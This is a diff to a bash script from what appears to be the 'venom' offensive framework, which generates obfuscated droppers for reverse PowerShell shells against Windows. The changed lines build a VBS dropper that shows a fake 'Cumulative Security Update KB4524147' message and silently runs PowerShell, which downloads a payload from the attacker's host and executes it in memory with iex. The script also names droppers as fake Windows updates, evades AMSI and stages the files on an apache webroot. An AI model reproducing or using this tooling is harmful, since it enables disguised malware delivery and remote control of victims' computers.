@@ -11952,7 +11952,7 @@ cat << !
     | DESCRIPTION        : Reverse TCP Powershell Shell
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : WinHttpRequest (Fileless)
-    | DROPPER EXTENSION  : PS1
+    | DROPPER EXTENSION  : PS1|VBS
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : NOT AVAILABLE
 
@@ -11967,10 +11967,10 @@ cat << !
 
     AGENT Nº3
     ╔──────────────────────────────────────────────────────────────
-    | DESCRIPTION        : Reverse Powershell Shell (hex obfuscation)
+    | DESCRIPTION        : Reverse Powershell Shell (hex ip obfuscation)
     | TARGET SYSTEMS     : Windows (vista|7|8|8.1|10)
     | LOLBin             : Powershell (DownloadFile)
-    | DROPPER EXTENSION  : .{RANDOM}.BAT (MITRE T1036)
+    | DROPPER EXTENSION  : .{random}.BAT (MITRE T1036)
     | AGENT EXTENSION    : PS1
     |_AGENT PERSISTENCE  : AVAILABLE
 
@@ -12022,7 +12022,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 Drop=$(zenity --title="☠ Enter DROPPER NAME ☠" --text "example: Update-KB4524147\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 NaM=$(zenity --title="☠ Enter PAYLOAD NAME ☠" --text "example: Security-Update\nWarning: Allways Start FileNames With [Capital Letters]" --entry --width 300) > /dev/null 2>&1
 if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
-   rpath=$(zenity --title="☠ Enter 'Silent Dropper' Upload Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For 'Silent Dropper' Drop.\nRemark: Only PS environment var's accepted!" --entry --width 350) > /dev/null 2>&1
+   rpath=$(zenity --title="☠ Enter 'Silent Dropper' Build Path (target dir) ☠" --text "example: tmp\nexample: LocalAppData (*)\nexample: userprofile\\\\\\\Desktop\n\n(*) Recomended Path For 'Silent Dropper' build.\nRemark: Only PS environment var's accepted!" --entry --width 350) > /dev/null 2>&1
 fi
 
 
@@ -12035,23 +12035,14 @@ if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
 ## Display final settings to user
+if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then ext="ps1"; else ext="vbs"; fi
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
     LPORT    : $lport
     LHOST    : $lhost
     LOLBin   : WinHttpRequest
-!
-if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
-cat << !
-    DROPPER  : $IPATH/output/$Drop.ps1
-!
-else
-cat << !
-    DROPPER  : $IPATH/output/$Drop.vbs
-!
-fi
-cat << !
+    DROPPER  : $IPATH/output/$Drop.$ext
     AGENT    : $IPATH/output/$NaM.ps1
     UPLOADTO : Fileless (In-Memory)
     SILENT EXECUTION : $easter_egg
@@ -12059,14 +12050,13 @@ cat << !
 echo "---"
 
 
-## BUILD DROPPER (with Get-HotFix decoy command)
+## BUILD DROPPER (with Get-HotFix -Description - decoy command)
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
-echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
-
 if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
+   echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
    ## Hidden powershell execution terminal windows
    # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the REAL dropper (KB4524147_4nF7.ps1)
-   # then it will execute it in a PS hidden console (to download/exec payload.ps1 in in-memory)..
+   # then it will execute it in one PS hidden console (to download/execute real payload.ps1 in-memory)..
    echo "<#" > $IPATH/output/$Drop.ps1
    echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
    echo "#>" >> $IPATH/output/$Drop.ps1
@@ -12081,13 +12071,15 @@ if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
    echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
    echo "Start-Sleep -Seconds 2;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
 else
-   ## Silent Execution -> OBFUSCATION=ON (none terminal pops up)
-   # REMARK: A MessageBox will pop up announcing that are KB updates available..
+   echo "${BlueF}[☠]${white} Building Obfuscated vbs dropper ..${white}";sleep 2
+   ## Silent Execution -> OBFUSCATION=ON (none PS terminal window pops up)
+   # REMARK: A MessageBox will pop up announcing that are KB updates available.
+   # TODO: Wait for @coding9 to know if shell works.. then: & ('ie'+'x')
    echo "' Framework: venom v1.0.16 (amsi evasion)" > $IPATH/output/$Drop.vbs
-   echo "Dim str,x" >> $IPATH/output/$Drop.vbs
+   echo "Dim domain,x" >> $IPATH/output/$Drop.vbs
    echo "Set objShell = WScript.CreateObject(\"WScript.Shell\")" >> $IPATH/output/$Drop.vbs
-   echo "str = objShell.ExpandEnvironmentStrings(\"%userdomain%\")" >> $IPATH/output/$Drop.vbs
-   echo "x=MsgBox(\"This Security Patch Adresses CVE-2020-12067\"  & vbCrLf & \"RCE Vulnerability Under OS Builds 18362.535\" ,0+48, \"\" & str & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
+   echo "domain = objShell.ExpandEnvironmentStrings(\"%userdomain%\")" >> $IPATH/output/$Drop.vbs
+   echo "x=MsgBox(\"This Security Patch Adresses CVE-2020-12067\"  & vbCrLf & \"RCE Vulnerability Under OS Builds 18362.535\" ,0+48, \"\" & domain & \" - Cumulative Security Update KB4524147\")" >> $IPATH/output/$Drop.vbs
    echo "objShell.Run \"cmd /c powershell \$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText;\", 0, True" >> $IPATH/output/$Drop.vbs
 fi
 
@@ -12137,14 +12129,10 @@ fi
 cd $IPATH
 
 
-## Copy files to apache2 webroot
 cd $IPATH/output
+## Copy files to apache2 webroot
 echo "${BlueF}[☠]${white} Porting ALL required files to apache2 .."${Reset};sleep 2
-if [ "$easter_egg" = "OFF" ] || [ "$easter_egg" = "off" ]; then
-   zip $Drop.zip $Drop.ps1 > /dev/nul 2>&1
-else
-   zip $Drop.zip $Drop.vbs > /dev/nul 2>&1
-fi
+zip $Drop.zip $Drop.$ext > /dev/nul 2>&1
 cp $IPATH/output/$NaM.ps1 $ApAcHe/$NaM.ps1 > /dev/nul 2>&1
 cp $IPATH/output/$Drop.zip $ApAcHe/$Drop.zip > /dev/nul 2>&1
 cd $IPATH
